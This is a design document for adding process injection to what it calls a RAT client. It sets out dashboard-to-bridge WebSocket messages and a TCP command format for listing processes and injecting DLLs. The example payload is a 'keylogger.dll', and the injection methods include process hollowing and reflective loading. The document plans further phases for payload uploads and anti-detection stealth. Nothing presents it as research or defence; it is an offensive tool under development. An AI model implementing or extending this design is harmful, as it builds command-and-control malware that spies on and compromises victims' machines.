# PROCESS INJECTION API DESIGN

## WebSocket Message Structure

### 1. Get Process List
**Dashboard → Bridge**
```json
{
  "topic": "get_processes",
  "clientId": "client-uuid-123"
}
```

**Bridge → Dashboard**
```json
{
  "topic": "process_list",
  "clientId": "client-uuid-123",
  "processes": [
    {
      "pid": 1234,
      "name": "explorer.exe",
      "sessionId": 1,
      "memoryUsage": 52428800,
      "threadCount": 45,
      "parentPid": 123,
      "architecture": "x64",
      "user": "Administrator",
      "path": "C:\\Windows\\explorer.exe"
    }
  ]
}
```

### 2. Inject DLL
**Dashboard → Bridge**
```json
{
  "topic": "inject_dll",
  "clientId": "client-uuid-123",
  "pid": 1234,
  "dllPath": "C:\\payloads\\keylogger.dll",
  "method": "createremotethread"  // Options: createremotethread, apcinjection, setwindowshook, reflective, processhollowing
}
```

**Bridge → Dashboard**
```json
{
  "topic": "injection_result",
  "clientId": "client-uuid-123",
  "success": true,
  "pid": 1234,
  "dllPath": "C:\\payloads\\keylogger.dll",
  "method": "createremotethread",
  "threadId": 5678,
  "error": null,
  "timestamp": "2026-04-22T14:34:00.000Z"
}
```

## RAT Client Protocol Extensions

### New Command Types
```
PROCESS_LIST     - Request process enumeration
INJECT_DLL       - Inject DLL into specified process
```

### Command Format (TCP to RAT Client)
```
PROCESS_LIST\n
```

```
INJECT_DLL|PID|DLL_PATH|METHOD\n
```

### Response Format (RAT Client to Bridge)
```
PROCESS_LIST_RESPONSE|JSON_PROCESS_LIST\n
```

```
INJECTION_RESULT|SUCCESS|PID|THREAD_ID|ERROR_MESSAGE\n
```

## Implementation Steps

### 1. Enhanced Process Enumeration (C++)
- Modify `EnumerateProcesses()` to return JSON string
- Add memory usage, architecture detection, user context
- Create `GetProcessListJSON()` function

### 2. Enhanced Injection Function (C++)
- Add method parameter to `InjectDllIntoProcess()`
- Implement different injection techniques
- Return structured result with thread ID

### 3. Bridge WebSocket Handlers (JavaScript)
- Add `case 'get_processes':` handler
- Add `case 'inject_dll':` handler
- Forward to appropriate RAT client
- Handle responses and broadcast to dashboard

### 4. RAT Client Updates (C++)
- Add `handleProcessListCommand()`
- Add `handleInjectDllCommand()`
- Integrate with existing command system

### 5. Frontend Integration (TypeScript)
- Replace mock data with real WebSocket calls
- Add loading states
- Handle real-time updates

## File Structure Updates

### New Files
```
rootserver/process_utils.h
rootserver/process_utils.cpp    // Enhanced process enumeration
rootserver/injection_methods.h  // Multiple injection techniques
```

### Modified Files
```
bridge/index.js                 // Add WebSocket handlers
rootserver/main.cpp             // Add new command handlers
Client/frontend/src/UI/ProcessInjectionPanel.tsx  // Real integration
```

## Security Considerations
1. **Admin Privileges**: Some methods require admin rights
2. **DLL Validation**: Verify DLL exists before injection
3. **Error Handling**: Comprehensive error reporting
4. **Logging**: All injection attempts logged to database

## Testing Strategy
1. **Unit Tests**: Individual injection methods
2. **Integration**: End-to-end WebSocket flow
3. **Mock Testing**: Without actual injection
4. **Live Testing**: With test processes (notepad.exe)

## Next Phase (Phase 3)
1. **DLL Upload**: Upload custom DLLs via dashboard
2. **Process Monitoring**: Real-time process creation/deletion
3. **Injection Templates**: Pre-configured payloads
4. **Stealth Techniques**: Anti-detection methods